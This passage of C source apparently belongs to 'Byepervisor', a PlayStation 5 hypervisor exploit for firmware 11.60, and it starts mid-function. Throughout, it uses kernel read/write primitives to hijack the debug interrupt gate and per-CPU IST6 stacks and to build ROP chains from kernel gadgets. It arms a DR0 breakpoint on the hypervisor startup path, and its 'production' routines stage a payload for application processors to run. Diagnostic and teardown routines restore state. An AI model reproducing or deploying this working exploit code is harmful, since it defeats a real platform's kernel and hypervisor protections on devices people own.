         kread64(handler_va + ISSUE9_FRAME_OFF + 8),
         kread64(handler_va + ISSUE9_FRAME_OFF + 0x10));
  for (int cpu = 1; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t marker = kread64(result + (uint64_t)cpu * 8);
    if (marker)
      printf("[issue9-dr0] foreign path cpu=%d marker=%016lx\n", cpu, marker);
    if (marker)
      bad++;
  }
  if (kread64(db_gate) != saved_gate_lo ||
      kread64(db_gate + 8) != saved_gate_hi)
    bad++;
  if (kread64(result) != DR0_HIT_MARKER ||
      kread64(handler_va + ISSUE9_FRAME_OFF) != hook_target)
    bad++;

  rc = restore_page_entries(page_patches, page_patch_count);
  printf("[issue9-dr0] teardown gate=stock IST6=%s page-table=%s\n",
         bad ? "check-failed" : "restored", rc ? "FAILED" : "restored");
  if (bad || rc) {
    notifyf("Byepervisor DR0 diagnostic FAILED\nPower-cycle before retrying");
    return 11;
  }

  printf("[issue9-dr0] PASS: intended DR0 hit, no foreign CPU entry\n");
  notifyf("Byepervisor DR0 diagnostic PASS\nGate stock, DR7 clear, 16/16 IST6 restored");
  return 0;
}

/* Persistent but non-invasive resume probe.  DR0 targets the real startup_mp
 * wrapper.  The selected handler only records the hit, clears DR7, restores the
 * stock gate, preserves RDI, and resumes the untouched wrapper at its entry.
 * It never copies break_hv and never changes nested paging. */
#define RESUME_STATE_ARMED      0x493952455341524DULL /* "I9RESARM" */
#define RESUME_HIT_MARKER       0x4939524553484954ULL /* "I9RESHIT" */

static int build_passthrough_stack(uint8_t *segment, uint64_t segment_va)
{
  uint64_t trampoline = segment_va + ISSUE9_IRET_OFF;
  size_t off = ISSUE9_TOP_OFF;

  memset(segment, 0, DR0_BLOCK_SIZE);
  memcpy(segment + ISSUE9_IRET_OFF,
         &(uint64_t){kgadget(KERNEL_GADGET_IRETQ)}, sizeof(uint64_t));
  return chain_q(segment, &off, kgadget(KERNEL_GADGET_POP_RSP)) ||
         chain_q(segment, &off, trampoline);
}

static int build_resume_handler(uint8_t *handler, uint64_t handler_va,
                                uint64_t db_gate, uint64_t saved_gate_lo,
                                uint64_t result)
{
  uint64_t trampoline = handler_va + ISSUE9_IRET_OFF;
  size_t save_addr_off, restore_rdi_off;
  size_t off = ISSUE9_TOP_OFF;

  memset(handler, 0, 0x400);
  memcpy(handler + ISSUE9_IRET_OFF,
         &(uint64_t){kgadget(KERNEL_GADGET_IRETQ)}, sizeof(uint64_t));

  /* Preserve the startup_mp core argument.  RAX and RCX are caller-saved and
   * the wrapper overwrites both before their first use. */
  if (dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_MOV_RAX_RDI)) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_POP_RCX)))
    return -1;
  save_addr_off = off;
  if (dr0_chain_q(handler, &off, 0x400, 0) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_ST_RCX_RAX)) ||
      dr0_chain_store(handler, &off, 0x400, db_gate, saved_gate_lo) ||
      dr0_chain_store(handler, &off, 0x400, result, RESUME_HIT_MARKER) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_POP_RAX)) ||
      dr0_chain_q(handler, &off, 0x400, 0) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_SET_DR7)) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_POP_RDI)))
    return -1;
  restore_rdi_off = off;
  if (dr0_chain_q(handler, &off, 0x400, 0) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_POP_RSP)) ||
      dr0_chain_q(handler, &off, 0x400, trampoline))
    return -1;

  memcpy(handler + save_addr_off,
         &(uint64_t){handler_va + restore_rdi_off}, sizeof(uint64_t));
  return 0;
}

static int finish_resume_probe(uint64_t cave, uint64_t tss_base,
                               uint64_t db_gate)
{
  uint64_t save = cave + ISSUE9_SAVE_OFF;
  uint64_t handler = cave + DR0_HANDLER_OFF;
  uint64_t target = kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL);
  uint64_t saved_ist[ISSUE9_NCPU];
  int bad = 0, passthrough_hits = 0;

  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++)
    saved_ist[cpu] = kread64(save + S_ISTS + (uint64_t)cpu * 8);

  if (kread64(db_gate) != kread64(save + S_GATE_LO))
    bad++;
  if (kread64(db_gate + 8) != kread64(save + S_GATE_HI))
    bad++;
  bad += restore_ists(tss_base, saved_ist);

  for (int cpu = 1; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t frame = cave + DR0_FALLBACKS_OFF
                   + (uint64_t)(cpu - 1) * DR0_BLOCK_SIZE + ISSUE9_FRAME_OFF;
    uint64_t rip = kread64(frame);
    uint64_t cs = kread64(frame + 8);
    if (rip || cs) {
      passthrough_hits++;
      printf("[issue9-resume] passthrough cpu=%d rip=%016lx cs=%lx flags=%016lx\n",
             cpu, rip, cs, kread64(frame + 0x10));
    }
  }

  printf("[issue9-resume] hit=%016lx rip=%016lx cs=%lx flags=%016lx\n",
         kread64(cave + DR0_RESULT_OFF),
         kread64(handler + ISSUE9_FRAME_OFF),
         kread64(handler + ISSUE9_FRAME_OFF + 8),
         kread64(handler + ISSUE9_FRAME_OFF + 0x10));
  printf("[issue9-resume] non-selected passthrough entries=%d\n",
         passthrough_hits);

  if (kread64(cave + DR0_RESULT_OFF) != RESUME_HIT_MARKER ||
      kread64(handler + ISSUE9_FRAME_OFF) != target)
    bad++;
  if (!bad)
    kwrite64(save + S_STATE, 0);

  if (bad) {
    printf("[issue9-resume] FAIL: recovery verification failed; power-cycle\n");
    notifyf("Byepervisor resume probe FAILED\nPower-cycle before retrying");
    return 11;
  }

  printf("[issue9-resume] PASS: exact startup_mp entry observed and resumed\n");
  printf("[issue9-resume] stock gate and 16/16 IST6 restored\n");
  notifyf("Byepervisor resume probe PASS\nExact startup_mp entry observed");
  return 0;
}

int issue9_resume_diag_run(uint64_t cave)
{
  uint64_t idt_base = kdlsym(KERNEL_SYM_IDT_ARRAY);
  uint64_t tss_base = kdlsym(KERNEL_SYM_COMMON_TSS);
  uint64_t db_gate = idt_base + 16 * KH_VEC_DB;
  uint64_t save = cave + ISSUE9_SAVE_OFF;
  uint64_t result = cave + DR0_RESULT_OFF;
  uint64_t arm_va = cave + DR0_ARM_OFF;
  uint64_t handler_va = cave + DR0_HANDLER_OFF;
  uint64_t target = kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL);
  uint64_t saved_gate_lo, saved_gate_hi, gate_lo, gate_hi;
  uint64_t saved_ist[ISSUE9_NCPU];
  issue9_page_patch_t patches[8];
  uint8_t arm[0x400], handler[0x400], fallback[DR0_BLOCK_SIZE];
  uint8_t verify[0x400];
  int patch_count = 0, bad = 0;

  printf("[issue9-resume] bounded 11.60 startup_mp provenance probe\n");
  printf("[issue9-resume] no break_hv copy and no hypervisor modification\n");

  if ((kernel_get_fw_version() & 0xffff0000U) != 0x11600000U)
    return 1;

  if (kread64(save + S_STATE) == RESUME_STATE_ARMED) {
    if (kread64(result) == RESUME_HIT_MARKER)
      return finish_resume_probe(cave, tss_base, db_gate);
    printf("[issue9-resume] probe is already armed; enter rest mode and resume\n");
    notifyf("Byepervisor resume probe armed\nEnter rest mode and resume");
    goto wait_for_hit;
  }
  if (kread64(save + S_STATE) != 0 ||
      kread64(cave + PRODUCTION_STATE_OFF) != 0) {
    printf("[issue9-resume] REFUSE: another hook owns the saved state\n");
    return 3;
  }

  saved_gate_lo = kread64(db_gate);
  saved_gate_hi = kread64(db_gate + 8);
  if (!((saved_gate_lo >> 47) & 1) ||
      ((saved_gate_lo >> 32) & 7) != 4 ||
      verify_tss_layout(tss_base, saved_ist))
    return 4;
  gate_encode(kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET),
              (uint16_t)(saved_gate_lo >> 16), 6, &gate_lo, &gate_hi);
  if (gate_hi != saved_gate_hi)
    return 5;

  memset(patches, 0, sizeof patches);
  if (make_cave_writable(cave, patches, &patch_count)) {
    restore_page_entries(patches, patch_count);
    return 6;
  }
  if (patch_count) {
    printf("[issue9-resume] REFUSE: persistent probe would need %d mapping changes\n",
           patch_count);
    restore_page_entries(patches, patch_count);
    return 6;
  }

  if (build_dr0_arm(arm, arm_va, target,
                    tss_ist_slot(tss_base, DR0_SELECTED_CPU, 6),
                    handler_va + ISSUE9_TOP_OFF) ||
      build_resume_handler(handler, handler_va, db_gate, saved_gate_lo, result))
    return 7;
  kwrite(arm_va, arm, sizeof arm);
  kwrite(handler_va, handler, sizeof handler);
  memset(verify, 0, sizeof verify);
  kread(arm_va, verify, sizeof arm);
  if (memcmp(verify, arm, sizeof arm) != 0)
    return 7;
  memset(verify, 0, sizeof verify);
  kread(handler_va, verify, sizeof handler);
  if (memcmp(verify, handler, sizeof handler) != 0)
    return 7;

  for (int cpu = 1; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t va = cave + DR0_FALLBACKS_OFF
                + (uint64_t)(cpu - 1) * DR0_BLOCK_SIZE;
    if (build_passthrough_stack(fallback, va))
      return 7;
    kwrite(va, fallback, sizeof fallback);
    memset(verify, 0, DR0_BLOCK_SIZE);
    kread(va, verify, DR0_BLOCK_SIZE);
    if (memcmp(verify, fallback, DR0_BLOCK_SIZE) != 0)
      return 7;
  }
  kwrite64(result, 0);

  kwrite64(save + S_GATE_LO, saved_gate_lo);
  kwrite64(save + S_GATE_HI, saved_gate_hi);
  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++)
    kwrite64(save + S_ISTS + (uint64_t)cpu * 8, saved_ist[cpu]);
  kwrite64(save + S_STATE, RESUME_STATE_ARMED);
  if (kread64(save + S_STATE) != RESUME_STATE_ARMED)
    return 8;

  kwrite64(tss_ist_slot(tss_base, 0, 6), arm_va + ISSUE9_TOP_OFF);
  for (int cpu = 1; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t top = cave + DR0_FALLBACKS_OFF
                 + (uint64_t)(cpu - 1) * DR0_BLOCK_SIZE + ISSUE9_TOP_OFF;
    kwrite64(tss_ist_slot(tss_base, cpu, 6), top);
  }
  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t want = cpu == 0
                  ? arm_va + ISSUE9_TOP_OFF
                  : cave + DR0_FALLBACKS_OFF
                    + (uint64_t)(cpu - 1) * DR0_BLOCK_SIZE + ISSUE9_TOP_OFF;
    if (kread64(tss_ist_slot(tss_base, cpu, 6)) != want)
      bad++;
  }
  if (bad) {
    restore_ists(tss_base, saved_ist);
    kwrite64(save + S_STATE, 0);
    return 9;
  }

  printf("[issue9-resume] isolated IST6 paths verified; arming resume target\n");
  arm_dr0_and_return(db_gate, gate_lo,
                     arm_va + DR0_ARM_CTX_OFF,
                     arm_va + DR0_ARM_CONT_OFF + 6 * sizeof(uint64_t));
  printf("[issue9-resume] armed; enter rest mode and resume\n");
  notifyf("Byepervisor resume probe armed\nEnter rest mode and resume");

wait_for_hit:
  for (;;) {
    if (kread64(result) == RESUME_HIT_MARKER)
      return finish_resume_probe(cave, tss_base, db_gate);
    sceKernelSleep(1);
  }
}

int issue9_resume_abort_run(uint64_t cave)
{
  uint64_t tss_base = kdlsym(KERNEL_SYM_COMMON_TSS);
  uint64_t db_gate = kdlsym(KERNEL_SYM_IDT_ARRAY) + 16 * KH_VEC_DB;
  uint64_t save = cave + ISSUE9_SAVE_OFF;
  uint64_t result = cave + DR0_RESULT_OFF;
  uint64_t state = kread64(save + S_STATE);
  uint64_t saved_gate_lo = kread64(save + S_GATE_LO);
  uint64_t saved_gate_hi = kread64(save + S_GATE_HI);
  uint64_t saved_ist[ISSUE9_NCPU];
  int bad;

  printf("[issue9-abort] bounded resume-probe teardown\n");
  printf("[issue9-abort] state=%016lx gate=%016lx/%016lx\n",
         state, kread64(db_gate), kread64(db_gate + 8));

  if (state != RESUME_STATE_ARMED) {
    printf("[issue9-abort] no armed resume probe found\n");
    return 0;
  }
  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++)
    saved_ist[cpu] = kread64(save + S_ISTS + (uint64_t)cpu * 8);

  /* A custom low gate means DR0 is still armed.  The selected handler is
   * already installed, so one immediate TF invokes its normal gate restore
   * and DR7-clear path. */
  if (kread64(db_gate) != saved_gate_lo)
    cleanup_single_step();

  /* Hide the synthetic abort hit from a previous waiter before its next poll. */
  kwrite64(result, 0);
  kwrite64(db_gate + 8, saved_gate_hi);
  kwrite64(db_gate, saved_gate_lo);
  bad = restore_ists(tss_base, saved_ist);
  kwrite64(save + S_STATE, 0);

  if (kread64(db_gate) != saved_gate_lo ||
      kread64(db_gate + 8) != saved_gate_hi || bad ||
      kread64(save + S_STATE) != 0) {
    printf("[issue9-abort] FAIL: teardown verification failed\n");
    notifyf("Byepervisor teardown FAILED\nPower-cycle before continuing");
    return 1;
  }

  printf("[issue9-abort] PASS: gate stock, DR7 clear, 16/16 IST6 restored\n");
  notifyf("Byepervisor resume probe cancelled safely");
  return 0;
}

#define PROD_STATE_ARMED        0x493950524F444152ULL /* "I9PRODAR" */
#define PROD_BREAK_SRC_OFF      0x2800ULL
#define PROD_BREAK_COPY_SIZE    0x800ULL
#define PROD_PAYLOAD_PAGE       0x3FFFF000ULL
#define PROD_AP_MODE_1160       0x313631312D504142ULL /* "BAP-1161" */
#define PROD_CHAIN_MARK         0x434841494E2D3031ULL /* "CHAIN-01" */

_Static_assert(PROD_BREAK_SRC_OFF + PROD_BREAK_COPY_SIZE <= ISSUE9_SAVE_OFF,
               "production AP source overlaps recovery state");
_Static_assert(ISSUE9_PROD_STASH_OFF + 0x100 <= 0x4000,
               "production result stash exceeds cave");

static int build_production_handler(uint8_t *handler, uint64_t handler_va,
                                    uint64_t cave, uint64_t db_gate,
                                    uint64_t saved_gate_lo, uint64_t cr3,
                                    uint64_t hv_loader_pa)
{
  uint64_t trampoline = handler_va + ISSUE9_IRET_OFF;
  uint64_t payload_va = kdldmap(PROD_PAYLOAD_PAGE);
  uint64_t oracle = cave + KH_OFF_USER;
  size_t save_addr_off, restore_rdi_off;
  size_t off = ISSUE9_TOP_OFF;

  memset(handler, 0, 0x400);
  memcpy(handler + ISSUE9_IRET_OFF,
         &(uint64_t){kgadget(KERNEL_GADGET_IRETQ)}, sizeof(uint64_t));

  /* Save the wrapper's core-id argument into the later POP_RDI operand. */
  if (dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_MOV_RAX_RDI)) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_POP_RCX)))
    return -1;
  save_addr_off = off;
  if (dr0_chain_q(handler, &off, 0x400, 0) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_ST_RCX_RAX)) ||
      dr0_chain_store(handler, &off, 0x400, db_gate, saved_gate_lo) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_POP_RAX)) ||
      dr0_chain_q(handler, &off, 0x400, 0) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_SET_DR7)) ||
      dr0_chain_store(handler, &off, 0x400,
                      oracle + 0x20, PROD_CHAIN_MARK))
    return -1;

  /* Stage the AP payload only after the gate is stock and DR7 is clear. */
  if (dr0_chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_CLD)) ||
      dr0_chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RDI)) ||
      dr0_chain_q(handler, &off, 0x400, payload_va) ||
      dr0_chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RSI)) ||
      dr0_chain_q(handler, &off, 0x400, cave + PROD_BREAK_SRC_OFF) ||
      dr0_chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RCX)) ||
      dr0_chain_q(handler, &off, 0x400, PROD_BREAK_COPY_SIZE) ||
      dr0_chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_REP_MOVSB)))
    return -1;

#define PROD_STORE(offset, value) \
  do { \
    if (dr0_chain_store(handler, &off, 0x400, \
                        kdldmap(PROD_PAYLOAD_PAGE + (offset)), (value))) \
      return -1; \
  } while (0)
  PROD_STORE(0xF00, kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
  PROD_STORE(0xF08, kdldmap(0));
  PROD_STORE(0xF10, oracle);
  PROD_STORE(0xF18, hv_loader_pa);
  PROD_STORE(0xF20, cave + ISSUE9_PROD_STASH_OFF);
  PROD_STORE(0xF28, payload_va);
  PROD_STORE(0xF30, cr3);
  PROD_STORE(0xF38, PROD_AP_MODE_1160);
#undef PROD_STORE

  if (dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_POP_RDI)))
    return -1;
  restore_rdi_off = off;
  if (dr0_chain_q(handler, &off, 0x400, 0) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_POP_RSI)) ||
      dr0_chain_q(handler, &off, 0x400, payload_va) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_POP_RDX)) ||
      dr0_chain_q(handler, &off, 0x400, cr3) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_POP_RSP)) ||
      dr0_chain_q(handler, &off, 0x400, trampoline))
    return -1;

  memcpy(handler + save_addr_off,
         &(uint64_t){handler_va + restore_rdi_off}, sizeof(uint64_t));
  printf("[11.60] hardened handler chain bytes=0x%lx\n",
         (unsigned long)(off - ISSUE9_TOP_OFF));
  return 0;
}

int issue9_production_is_armed(uint64_t cave)
{
  return kread64(cave + ISSUE9_SAVE_OFF + S_STATE) == PROD_STATE_ARMED;
}

int issue9_production_arm(uint64_t cave, uint64_t cr3,
                          uint64_t hv_loader_pa,
                          const uint8_t *payload, size_t payload_len)
{
  uint64_t tss_base = kdlsym(KERNEL_SYM_COMMON_TSS);
  uint64_t db_gate = kdlsym(KERNEL_SYM_IDT_ARRAY) + 16 * KH_VEC_DB;
  uint64_t save = cave + ISSUE9_SAVE_OFF;
  uint64_t arm_va = cave + DR0_ARM_OFF;
  uint64_t handler_va = cave + DR0_HANDLER_OFF;
  uint64_t target = kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL);
  uint64_t saved_gate_lo, saved_gate_hi, gate_lo, gate_hi;
  uint64_t saved_ist[ISSUE9_NCPU];
  uint8_t arm[0x400], handler[0x400], fallback[DR0_BLOCK_SIZE];
  uint8_t verify[0x400], staged[PROD_BREAK_COPY_SIZE];
  int bad = 0;

  if ((kernel_get_fw_version() & 0xffff0000U) != 0x11600000U ||
      !payload || payload_len == 0 || payload_len > sizeof staged ||
      issue9_production_is_armed(cave))
    return -1;

  saved_gate_lo = kread64(db_gate);
  saved_gate_hi = kread64(db_gate + 8);
  if (!((saved_gate_lo >> 47) & 1) ||
      ((saved_gate_lo >> 32) & 7) != 4 ||
      verify_tss_layout(tss_base, saved_ist))
    return -2;
  gate_encode(kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET),
              (uint16_t)(saved_gate_lo >> 16), 6, &gate_lo, &gate_hi);
  if (gate_hi != saved_gate_hi)
    return -3;

  memset(staged, 0, sizeof staged);
  memcpy(staged, payload, payload_len);
  kwrite(cave + PROD_BREAK_SRC_OFF, staged, sizeof staged);
  for (size_t checked = 0; checked < sizeof staged; checked += sizeof verify) {
    kread(cave + PROD_BREAK_SRC_OFF + checked, verify, sizeof verify);
    if (memcmp(verify, staged + checked, sizeof verify) != 0)
      return -4;
  }
  if (memcmp(staged, payload, payload_len) != 0)
    return -4;

  if (build_dr0_arm(arm, arm_va, target,
                    tss_ist_slot(tss_base, DR0_SELECTED_CPU, 6),
                    handler_va + ISSUE9_TOP_OFF) ||
      build_production_handler(handler, handler_va, cave, db_gate,
                               saved_gate_lo, cr3, hv_loader_pa))
    return -5;
  kwrite(arm_va, arm, sizeof arm);
  kwrite(handler_va, handler, sizeof handler);
  memset(verify, 0, sizeof verify);
  kread(arm_va, verify, sizeof arm);
  if (memcmp(verify, arm, sizeof arm) != 0)
    return -6;
  memset(verify, 0, sizeof verify);
  kread(handler_va, verify, sizeof handler);
  if (memcmp(verify, handler, sizeof handler) != 0)
    return -6;

  for (int cpu = 1; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t va = cave + DR0_FALLBACKS_OFF
                + (uint64_t)(cpu - 1) * DR0_BLOCK_SIZE;
    if (build_passthrough_stack(fallback, va))
      return -7;
    kwrite(va, fallback, sizeof fallback);
    memset(verify, 0, DR0_BLOCK_SIZE);
    kread(va, verify, DR0_BLOCK_SIZE);
    if (memcmp(verify, fallback, DR0_BLOCK_SIZE) != 0)
      return -7;
  }

  kwrite64(save + S_GATE_LO, saved_gate_lo);
  kwrite64(save + S_GATE_HI, saved_gate_hi);
  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++)
    kwrite64(save + S_ISTS + (uint64_t)cpu * 8, saved_ist[cpu]);
  kwrite64(save + S_STATE, PROD_STATE_ARMED);
  if (kread64(save + S_STATE) != PROD_STATE_ARMED)
    return -8;

  kwrite64(tss_ist_slot(tss_base, 0, 6), arm_va + ISSUE9_TOP_OFF);
  for (int cpu = 1; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t top = cave + DR0_FALLBACKS_OFF
                 + (uint64_t)(cpu - 1) * DR0_BLOCK_SIZE + ISSUE9_TOP_OFF;
    kwrite64(tss_ist_slot(tss_base, cpu, 6), top);
  }
  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t want = cpu == 0
                  ? arm_va + ISSUE9_TOP_OFF
                  : cave + DR0_FALLBACKS_OFF
                    + (uint64_t)(cpu - 1) * DR0_BLOCK_SIZE + ISSUE9_TOP_OFF;
    if (kread64(tss_ist_slot(tss_base, cpu, 6)) != want)
      bad++;
  }
  if (bad) {
    restore_ists(tss_base, saved_ist);
    kwrite64(save + S_STATE, 0);
    return -9;
  }

  printf("[11.60] hardened hook: 16 isolated IST6 paths verified\n");
  printf("[11.60] hardened hook: gate last, then bounded TF arm\n");
  arm_dr0_and_return(db_gate, gate_lo,
                     arm_va + DR0_ARM_CTX_OFF,
                     arm_va + DR0_ARM_CONT_OFF + 6 * sizeof(uint64_t));
  return 0;
}

int issue9_production_cleanup(uint64_t cave)
{
  uint64_t tss_base = kdlsym(KERNEL_SYM_COMMON_TSS);
  uint64_t db_gate = kdlsym(KERNEL_SYM_IDT_ARRAY) + 16 * KH_VEC_DB;
  uint64_t save = cave + ISSUE9_SAVE_OFF;
  uint64_t saved_ist[ISSUE9_NCPU];
  uint64_t saved_gate_lo, saved_gate_hi;
  int bad;

  if (!issue9_production_is_armed(cave))
    return -1;
  saved_gate_lo = kread64(save + S_GATE_LO);
  saved_gate_hi = kread64(save + S_GATE_HI);
  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++)
    saved_ist[cpu] = kread64(save + S_ISTS + (uint64_t)cpu * 8);

  kwrite64(db_gate + 8, saved_gate_hi);
  kwrite64(db_gate, saved_gate_lo);
  bad = restore_ists(tss_base, saved_ist);
  if (kread64(db_gate) != saved_gate_lo ||
      kread64(db_gate + 8) != saved_gate_hi || bad)
    return -2;
  kwrite64(save + S_STATE, 0);
  return kread64(save + S_STATE) == 0 ? 0 : -3;
}
